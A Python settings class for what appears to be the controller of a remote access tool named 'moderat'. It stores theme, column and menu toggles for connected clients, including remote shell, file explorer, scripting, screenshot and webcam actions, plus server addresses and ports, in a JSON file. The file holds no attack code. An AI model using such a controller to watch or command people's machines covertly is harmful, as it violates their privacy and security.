import os
import json


class Settings:

    def __init__(self, parent):

        self.moderat = parent

        # APPEARANCE
        # General
        # interface
        self.moderatLanguage = 'english'
        self.moderatTheme = 'DarkBlue'
        self.moderatOpacity = 0.98
        # Online
        # appearance
        self.onlineClientsPerPage = 15
        # headers
        self.headerIpAddress = True
        self.headerClientId = True
        self.headerUser = True
        self.headerAlias = True
        self.headerTitle = True
        # menu
        self.menuLogViewer = True
        self.menuNote = True
        self.menuAlias = True
        self.menuUpdate = True
        self.menuShell = True
        self.menuExplorer = True
        self.menuScripting = True
        self.menuScreenshot = True
        self.menuWebcam = True
        # Offline
        self.offlineClientsPerPage = 15
        self.offlineHeaderIpAddress = True
        self.offlineHeaderClientId = True
        self.offlineHeaderAlias = True
        self.offlineHeaderLastOnline = True
        self.offlineMenuLogViewer = True
        self.offlineMenuAlias = True
        self.offlineMenuNote = True
        self.offlineMenuRemove = True
        # direct
        self.directHeaderIpAddress = True
        self.directHeaderClientId = True
        self.directHeaderComment = True
        self.directMenuShell = True
        self.directMenuExplorer = True
        self.directMenuScripting = True
        self.directMenuScreenshot = True
        self.directMenuWebcam = True

        # Server
        self.serverIpAddress = '127.0.0.1'
        self.serverPort = 5545
        self.serverUsername = ''

        # Direct Server
        self.directServerPort = 5595
        self.directServerDefaultIpAddress = '127.0.0.1'
        self.directServerDefaultPort = 5595
        self.directServerDefaultComment = 'Direct Client'

        self.config_file = 'settings.json'

        if not os.path.exists(self.config_file):
            self.save_settings()
        else:
            with open(self.config_file, 'r') as _f:
                settings = json.loads(_f.read())
                self.set_settings(settings)

    def save_settings(self):
        settings_payload = {
            'moderatLanguage': self.moderatLanguage,
            'moderatTheme': self.moderatTheme,
            'moderatOpacity': self.moderatOpacity,
            'onlineClientsPerPage': self.onlineClientsPerPage,
            'headerIpAddress': self.headerIpAddress,
            'headerClientId': self.headerClientId,
            'headerUser': self.headerUser,
            'headerAlias': self.headerAlias,
            'headerTitle': self.headerTitle,
            'menuLogViewer': self.menuLogViewer,
            'menuNote': self.menuNote,
            'menuAlias': self.menuAlias,
            'menuUpdate': self.menuUpdate,
            'menuShell': self.menuShell,
            'menuExplorer': self.menuExplorer,
            'menuScripting': self.menuScripting,
            'menuScreenshot': self.menuScreenshot,
            'menuWebcam': self.menuWebcam,
            'offlineClientsPerPage': self.offlineClientsPerPage,
            'offlineHeaderIpAddress': self.offlineHeaderIpAddress,
            'offlineHeaderClientId': self.offlineHeaderClientId,
            'offlineHeaderAlias': self.offlineHeaderAlias,
            'offlineHeaderLastOnline': self.offlineHeaderLastOnline,
            'offlineMenuLogViewer': self.offlineMenuLogViewer,
            'offlineMenuAlias': self.offlineMenuAlias,
            'offlineMenuNote': self.offlineMenuNote,
            'offlineMenuRemove': self.offlineMenuRemove,
            'directHeaderIpAddress': self.directHeaderIpAddress,
            'directHeaderClientId': self.directHeaderClientId,
            'directHeaderComment': self.directHeaderComment,
            'directMenuShell': self.directMenuShell,
            'directMenuExplorer': self.directMenuExplorer,
            'directMenuScripting': self.directMenuScripting,
            'directMenuScreenshot': self.directMenuScreenshot,
            'directMenuWebcam': self.directMenuWebcam,

            'serverIpAddress': self.serverIpAddress,
            'serverPort': self.serverPort,
            'serverUsername': self.serverUsername,

            'directServerPort': self.directServerPort,
            'directServerDefaultIpAddress': self.directServerDefaultIpAddress,
            'directServerDefaultPort': self.directServerDefaultPort,
            'directServerDefaultComment': self.directServerDefaultComment,
        }
        with open(self.config_file, 'w') as _f:
            _f.write(json.dumps(settings_payload))

    def set_settings(self, settings):
        for key in settings.keys():
            if key == 'moderatLanguage':
                self.moderatLanguage = settings[key]
            elif key == 'moderatTheme':
                self.moderatTheme = settings[key]
            elif key == 'moderatOpacity':
                self.moderatOpacity = settings[key]
            elif key == 'onlineClientsPerPage':
                self.onlineClientsPerPage = settings[key]
            elif key == 'headerIpAddress':
                self.headerIpAddress = settings[key]
            elif key == 'headerClientId':
                self.headerClientId = settings[key]
            elif key == 'headerUser':
                self.headerUser = settings[key]
            elif key == 'headerAlias':
                self.headerAlias = settings[key]
            elif key == 'headerTitle':
                self.headerTitle = settings[key]
            elif key == 'menuLogViewer':
                self.menuLogViewer = settings[key]
            elif key == 'menuNote':
                self.menuNote = settings[key]
            elif key == 'menuAlias':
                self.menuAlias = settings[key]
            elif key == 'menuUpdate':
                self.menuUpdate = settings[key]
            elif key == 'menuShell':
                self.menuShell = settings[key]
            elif key == 'menuExplorer':
                self.menuExplorer = settings[key]
            elif key == 'menuScripting':
                self.menuScripting = settings[key]
            elif key == 'menuScreenshot':
                self.menuScreenshot = settings[key]
            elif key == 'menuWebcam':
                self.menuWebcam = settings[key]

            elif key == 'offlineClientsPerPage':
                self.offlineClientsPerPage = settings[key]
            elif key == 'offlineHeaderIpAddress':
                self.offlineHeaderIpAddress = settings[key]
            elif key == 'offlineHeaderClientId':
                self.offlineHeaderClientId = settings[key]
            elif key == 'offlineHeaderAlias':
                self.offlineHeaderAlias = settings[key]
            elif key == 'offlineHeaderLastOnline':
                self.offlineHeaderLastOnline = settings[key]
            elif key == 'offlineMenuLogViewer':
                self.offlineMenuLogViewer = settings[key]

            elif key == 'offlineMenuAlias':
                self.offlineMenuAlias = settings[key]
            elif key == 'offlineMenuNote':
                self.offlineMenuNote = settings[key]
            elif key == 'offlineMenuRemove':
                self.offlineMenuRemove = settings[key]
            elif key == 'directHeaderIpAddress':
                self.directHeaderIpAddress = settings[key]
            elif key == 'directHeaderClientId':
                self.directHeaderClientId = settings[key]
            elif key == 'directHeaderComment':
                self.directHeaderComment = settings[key]
            elif key == 'directMenuShell':
                self.directMenuShell = settings[key]
            elif key == 'directMenuExplorer':
                self.directMenuExplorer = settings[key]
            elif key == 'directMenuScripting':
                self.directMenuScripting = settings[key]
            elif key == 'directMenuScreenshot':
                self.directMenuScreenshot = settings[key]
            elif key == 'directMenuWebcam':
                self.directMenuWebcam = settings[key]

            elif key == 'serverIpAddress':
                self.serverIpAddress = settings[key]
            elif key == 'serverPort':
                self.serverPort = settings[key]
            elif key == 'serverUsername':
                self.serverUsername = settings[key]

            elif key == 'directServerPort':
                self.directServerPort = settings[key]
            elif key == 'directServerDefaultIpAddress':
                self.directServerDefaultIpAddress = settings[key]
            elif key == 'directServerDefaultPort':
                self.directServerDefaultPort = settings[key]
            elif key == 'directServerDefaultComment':
                self.directServerDefaultComment = settings[key]

        self.save_settings()